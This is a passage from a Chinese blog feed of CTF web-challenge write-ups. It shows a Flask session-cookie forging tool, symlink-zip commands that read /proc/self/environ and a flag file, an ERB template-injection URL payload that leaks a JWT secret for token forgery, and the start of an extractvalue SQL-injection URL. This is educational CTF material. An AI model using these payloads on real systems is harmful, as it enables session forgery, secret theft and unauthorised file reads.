class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(ABC)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(help=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, help=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie structure'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, help=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie value'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure><p>用法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">解密:python flask_session_manager.py decode -c -s <span class="comment"># -c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">加密:python flask_session_manager.py encode -s -t <span class="comment"># -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</span></span><br></pre></td></tr></table></figure><p>按照这个代码解JWT结果如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line">&#123;<span class="string">'id'</span>: <span class="string">b'100'</span>, <span class="string">'is_login'</span>: <span class="literal">True</span>, <span class="string">'password'</span>: <span class="string">'123'</span>, <span class="string">'username'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">这里就可以看出不一样了，现在还没搞懂原因...</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span> -t <span class="string">"&#123;'id': b'1', 'is_login': True, 'password': '123', 'username': '123'&#125;"</span></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y<span class="number">-3</span>TE</span><br><span class="line">这里我们伪造id:<span class="string">b'1'</span>的用户session进行登录</span><br></pre></td></tr></table></figure><p>利用伪造的session，成功登录：<br><img src="http://ggb0n.cool/images/swpuctf01.png" alt=""></p><p>查看源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure><p>以正常逻辑来看，这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。这里我们可以上传一个<code>软链接压缩包</code>，来读取其他敏感文件而不是我们上传的文件。</p><p>结合 <code>showflag()</code>函数的源码，我们可以得知 <code>flag.jpg</code> 放在 flask 应用根目录的<code>flag</code>目录下。那么我们只要创建一个到<code>/xxx/flask/flag/flag.jpg</code>的软链接，即可读取 <code>flag.jpg</code> 文件。</p><p>两种方式构造：</p><ul><li>1、在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg。</li></ul><blockquote><p>命令如下：</p><p>ln -s /proc/self/cwd/flag/flag.jpg qwe </p><p>zip -ry qwe.zip qwe</p></blockquote><ul><li>2、在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</li></ul><blockquote><p>命令如下：</p><p>ln -s /proc/self/environ qqq </p><p>zip -ry qqq.zip qqq </p><p>ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www </p><p>zip -ry [<a href="http://www.zip\]\(http://www.zip\)">www.zip\]\(http://www.zip\)</a> www</p></blockquote><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>在上一步中，我们已经成功拿到上传的权限了，现在到linux中生成读取flag的软连接，上传之后服务端回显如下：<br><img src="http://ggb0n.cool/images/swpuctf04.png" alt=""></p><p>因为是一个有问题的图片，无法显示，其实就是BUU改了，它本质上还是一个txt，下载下来即可拿到flag。</p><h2 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h2><p>考察JWT伪造，ruby的ERB模板注入。后者是第一次接触</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现可以买flag，但是很贵，这个时候又可以进行work拿jkl，这点到啥时候去啊…<br><img src="http://ggb0n.cool/images/swpuctf05.png" alt=""></p><p>不过存在robots.txt，提示了<code>filebake</code>的存在：<br><img src="http://ggb0n.cool/images/swpuctf06.png" alt=""></p><p>访问<code>fileback</code>拿到源码：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>代码是ruby写的，还没学…不过从代码中可以看到出现了<code>JWT</code>，应该跟JWT伪造有关，稍微审一下代码发现<code>jkl</code>指的应该就是金币数量，同uid一起写进了cookie里，抓个包拿jwt解密看看：<br><img src="http://ggb0n.cool/images/swpuctf07.png" alt=""></p><p>可以看到<code>jkl</code>的值为<code>28</code>，也就是现有的金币数，那应该就是要伪造<code>JWT</code>来买到flag了，但是伪造需要<code>SECRET</code>，现在我们并没有，怎么办？</p><p>在<code>/work</code>路由下有这么一段代码：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')</span></span><br></pre></td></tr></table></figure><p>这里我们可以控制，但是只有7个字符，参考题解说是<code>ERB模板注入</code>，这里可以用ruby的预定义字符<code>$</code>对匹配的字符串进行读取，从而获取<code>SECRET</code>，l利用点当然也就在<code>/work</code>路由下了，可以抓包看看：</p><p><img src="http://ggb0n.cool/images/swpuctf08.png" alt=""></p><p>根据参数构造payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br><span class="line">即</span><br><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="http://ggb0n.cool/images/swpuctf09.png" alt=""></p><p>拿到SECRET之后，进行JWT伪造：<br><img src="http://ggb0n.cool/images/swpuctf10.png" alt=""></p><p>然后<code>buy flag</code>抓包进行替换即可买到flag：<br><img src="http://ggb0n.cool/images/swpuctf11.png" alt=""></p><p>由响应结果可以看到，已经成功买到了flag，但是响应中并没有啊，因为在代码中可以看到，flag其实被写入到了相应的JWT中，再去解密即可拿到。<br><img src="http://ggb0n.cool/images/swpuctf12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直想着复现来着，记事本里也记录了几个月了…🤣
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="Cookie攻击" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="二次注入" scheme="http://ggb0n.cool/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JWT伪造" scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="无列名查询" scheme="http://ggb0n.cool/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
    
      <category term="ERB模板注入" scheme="http://ggb0n.cool/tags/ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTF复现</title>
    <link href="http://ggb0n.cool/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-13T14:50:13.000Z</published>
    <updated>2020-04-22T00:15:31.612Z</updated>
    
    <content type="html"><![CDATA[<p>CTFtime上国外的比赛还是比较多的，而且大多也都比较有意思，开拓视野。<a id="more"></a></p><h2 id="RootersCTF-Babyweb"><a href="#RootersCTF-Babyweb" class="headerlink" title="RootersCTF-Babyweb"></a>RootersCTF-Babyweb</h2><p>My junior dev just set up a password protected webpage. Can you get in?</p><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>打开链接提示管理员的密码是18位，并且过滤掉了UNION SLEEP ‘ “ OR - BENCHMARK。因此利用爆破出密码是比较不现实的，结合题目提示是使用注入方法。看到单引号和双引号被过滤，猜测是被反斜杠转义掉，便尝试宽字节注入，使用<code>%df%27</code>进行测试，结果注入失败。</p><p>并且提示UNION、OR也都被过滤，原本想着利用大小写或者编码绕过，但是引号既然不能成功绕过，说明不能用闭合引号进行注入。经过多次尝试发现利用<code>extractvalue()</code>函数进行报错注入可以成功实现注入,因此可以结合concat函数实现注入。</p><p><code>extractvalue()</code>：函数功能是从目标XML中返回包含所查询值的字符串。</p><blockquote><p>EXTRACTVALUE (XML_document, XPath_string);</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)</p><p>extractvalue注入的原理：如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p></blockquote><h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>1、爆库名</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span 